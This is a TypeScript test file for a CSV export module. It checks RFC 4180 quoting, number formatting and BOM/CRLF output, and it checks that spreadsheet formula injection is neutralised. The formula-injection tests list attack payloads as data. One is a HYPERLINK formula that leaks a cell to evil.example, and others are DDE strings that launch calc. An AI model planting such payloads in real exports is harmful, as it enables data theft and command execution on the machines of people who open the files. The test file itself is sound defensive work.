import { describe, expect, it } from 'vitest';
import { CSV_BOM, csvDecimal, csvField, csvRow, neutraliseFormula, toCsv } from './csv';

describe('RFC 4180 quoting', () => {
  it('leaves plain text alone', () => {
    expect(csvField('Acme Studio')).toBe('Acme Studio');
    expect(csvField('PRJ-0042')).toBe('PRJ-0042');
  });

  it('quotes a field with a comma, and doubles an inner quote', () => {
    expect(csvField('Doe, Jane')).toBe('"Doe, Jane"');
    expect(csvField('She said "yes"')).toBe('"She said ""yes"""');
    expect(csvField('"')).toBe('""""');
  });

  it('quotes a field with a line break of any kind and keeps the break', () => {
    expect(csvField('line one\nline two')).toBe('"line one\nline two"');
    expect(csvField('line one\r\nline two')).toBe('"line one\r\nline two"');
    expect(csvField('a\rb')).toBe('"a\rb"');
  });

  it('quotes edge whitespace so a reader cannot trim it away', () => {
    expect(csvField(' padded')).toBe('" padded"');
    expect(csvField('padded ')).toBe('"padded "');
  });

  it('writes null and undefined as an empty field, and an empty string as empty', () => {
    expect(csvField(null)).toBe('');
    expect(csvField(undefined)).toBe('');
    expect(csvField('')).toBe('');
  });

  it('keeps unicode as is: rupee signs, accents, scripts and emoji', () => {
    expect(csvField('₹1,200 ')).toBe('"₹1,200 "');
    expect(csvField('Zoë Åström')).toBe('Zoë Åström');
    expect(csvField('प्रोडेवली')).toBe('प्रोडेवली');
    expect(csvField('Ship it 🚀')).toBe('Ship it 🚀');
  });

  it('drops control characters that mean nothing in a spreadsheet, but keeps tab, LF and CR for the checks that need them', () => {
    expect(csvField('a\u0000b\u0007c\u001fd\u007fe')).toBe('abcde');
    expect(csvField('a\tb')).toBe('a\tb');
  });
});

describe('formula injection', () => {
  const payloads = [
    '=HYPERLINK("http://evil.example/?x="&A1,"click")',
    '=1+1',
    '+cmd|\' /C calc\'!A0',
    '-2+3',
    '@SUM(A1:A9)',
    '=cmd|\' /C calc\'!A0',
    '+1-1',
    '-@A1',
  ];

  it.each(payloads)('prefixes a single quote to %s', (payload) => {
    const out = neutraliseFormula(payload);
    expect(out.startsWith("'")).toBe(true);
    expect(out).toBe(`'${payload}`);
  });

  it('prefixes cells that start with a tab or a carriage return', () => {
    expect(neutraliseFormula('\tTAB')).toBe("'\tTAB");
    expect(neutraliseFormula('\rCR')).toBe("'\rCR");
  });

  it('sees through leading spaces, tabs, newlines and zero-width characters', () => {
    expect(neutraliseFormula('  =1+1')).toBe("'  =1+1");
    expect(neutraliseFormula(' \t =1+1')).toBe("' \t =1+1");
    expect(neutraliseFormula('\n=1+1')).toBe("'\n=1+1");
    expect(neutraliseFormula(' =1+1')).toBe("' =1+1");
    expect(neutraliseFormula('​=1+1')).toBe("'​=1+1");
    expect(neutraliseFormula('﻿@SUM(A1)')).toBe("'﻿@SUM(A1)");
    expect(neutraliseFormula('   +cmd')).toBe("'   +cmd");
  });

  it('leaves text that merely contains a trigger character later on', () => {
    for (const text of ['a=b', 'Q3 - plan', 'me@example.com', '1+1', 'x-y', "it's fine", 'Ready=yes']) {
      expect(neutraliseFormula(text)).toBe(text);
    }
  });

  it('applies to every text cell, including a name or a note that looks like a number', () => {
    expect(csvField('-5')).toBe("'-5");
    expect(csvField('+91 98765 43210')).toBe("'+91 98765 43210");
    expect(csvField('=Jane Doe')).toBe("'=Jane Doe");
    expect(csvField('@everyone')).toBe("'@everyone");
  });

  it('quotes AND neutralises when both apply, quote prefix inside the quotes', () => {
    expect(csvField('=SUM(A1,A2)')).toBe('"\'=SUM(A1,A2)"');
    expect(csvField('=1+1\n=2+2')).toBe('"\'=1+1\n=2+2"');
    expect(csvField('@a "b"')).toBe('"\'@a ""b"""');
  });

  it('is not defeated by a control character in front of the trigger', () => {
    expect(csvField('\u0000=1+1')).toBe("'=1+1");
    expect(csvField('\u0007+1')).toBe("'+1");
  });
});

describe('numbers', () => {
  it('writes a trusted number as digits, with no quote prefix even when negative', () => {
    expect(csvField(42)).toBe('42');
    expect(csvField(0)).toBe('0');
    expect(csvField(-7)).toBe('-7');
    expect(csvField(83.42)).toBe('83.42');
    expect(csvField(0.000001)).toBe('0.000001');
  });

  it('never writes an exponent, NaN or Infinity', () => {
    expect(csvField(1e-7)).toBe('0');
    expect(csvField(Number.NaN)).toBe('');
    expect(csvField(Number.POSITIVE_INFINITY)).toBe('');
    expect(csvField(1e21)).toBe('');
  });

  it('writes exact decimal text from csvDecimal untouched, including a negative amount', () => {
    expect(csvField(csvDecimal('1250.50'))).toBe('1250.50');
    expect(csvField(csvDecimal('-12.50'))).toBe('-12.50');
    expect(csvField(csvDecimal('0'))).toBe('0');
  });

  it('refuses to wrap anything that is not plain digits, so typed text can never pass as a number', () => {
    for (const bad of ['=1+1', '1,250.50', '-', '1e5', ' 12', '12 ', '', '--1', '+5', '@1', '1.', '.5']) {
      expect(() => csvDecimal(bad)).toThrow();
    }
  });

  it('keeps a numeric-looking string a string', () => {
    expect(csvField('-12.50')).toBe("'-12.50");
    expect(csvField('12.50')).toBe('12.50');
  });
});

describe('records and the file', () => {
  it('joins cells with commas and keeps the column count', () => {
    expect(csvRow(['a', 'b,c', null, 5, csvDecimal('1.50')])).toBe('a,"b,c",,5,1.50');
  });

  it('starts with a BOM, ends every record with CRLF and uses CRLF between them', () => {
    const csv = toCsv(['Ref', 'Name'], [['CL-0001', 'Acme'], ['CL-0002', 'Zoë']]);
    expect(csv.startsWith(CSV_BOM)).toBe(true);
    expect(csv.charCodeAt(0)).toBe(0xfeff);
    expect(csv).toBe(`${CSV_BOM}Ref,Name\r\nCL-0001,Acme\r\nCL-0002,Zoë\r\n`);
    // No bare LF outside quoted fields.
    expect(csv.replace(/\r\n/g, '')).not.toContain('\n');
  });

  it('encodes as UTF-8: the BOM is EF BB BF and a rupee sign is three bytes', () => {
    const bytes = Buffer.from(toCsv(['A'], [['₹']]), 'utf8');
    expect([...bytes.subarray(0, 3)]).toEqual([0xef, 0xbb, 0xbf]);
    expect(bytes.includes(Buffer.from([0xe2, 0x82, 0xb9]))).toBe(true);
  });

  it('can leave the BOM out', () => {
    expect(toCsv(['A'], [['1']], { bom: false })).toBe('A\r\n1\r\n');
  });

  it('writes a header-only file for no rows', () => {
    expect(toCsv(['A', 'B'], [])).toBe(`${CSV_BOM}A,B\r\n`);
  });

  it('refuses a ragged row rather than shifting every later column', () => {
    expect(() => toCsv(['A', 'B'], [['only one']])).toThrow(/header has 2/);
  });

  it('round-trips a hostile row through a standards-compliant reader', () => {
    const rows = [['=cmd', 'plain', 'with "quotes", commas\nand a break', ' lead']];
    const csv = toCsv(['One', 'Two', 'Three', 'Four'], rows, { bom: false });
    expect(parse(csv)).toEqual([['One', 'Two', 'Three', 'Four'], ["'=cmd", 'plain', 'with "quotes", commas\nand a break', ' lead']]);
  });
});

/** A small RFC 4180 reader, so the tests prove the output parses back rather than just matching strings. */
function parse(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let field = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!;
    if (quoted) {
      if (c === '"' && text[i + 1] === '"') {
        field += '"';
        i++;
      } else if (c === '"') quoted = false;
      else field += c;
    } else if (c === '"') quoted = true;
    else if (c === ',') {
      row.push(field);
      field = '';
    } else if (c === '\r' && text[i + 1] === '\n') {
      row.push(field);
      rows.push(row);
      row = [];
      field = '';
      i++;
    } else field += c;
  }
  return rows;
}
